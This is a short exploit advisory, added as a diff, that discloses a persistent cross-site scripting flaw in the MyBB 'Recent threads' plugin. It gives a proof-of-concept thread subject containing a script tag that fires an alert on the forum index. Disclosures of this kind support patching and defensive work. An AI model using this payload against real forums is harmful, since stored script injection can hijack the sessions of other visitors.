@@ -1,0 +1,16 @@
+# Exploit Title: MyBB Recent threads
+# Date: 4th April 2018
+# Exploit Author: Perileos
+# Software Link: https://community.mybb.com/mods.php?action=view&pid=191
+# Version: 17.0
+# Tested on: Windows 10
+
+1. Description:
+This plugin shows recent threads in the side bar on your MyBB forum.
+
+2. Proof of concept:
+
+Persistent XSS
+- Create a thread with the following subject <p
+"""><SCRIPT>alert("XSS")</SCRIPT>">
+- Navigate to the index to see a board wide persistent XSS alert.
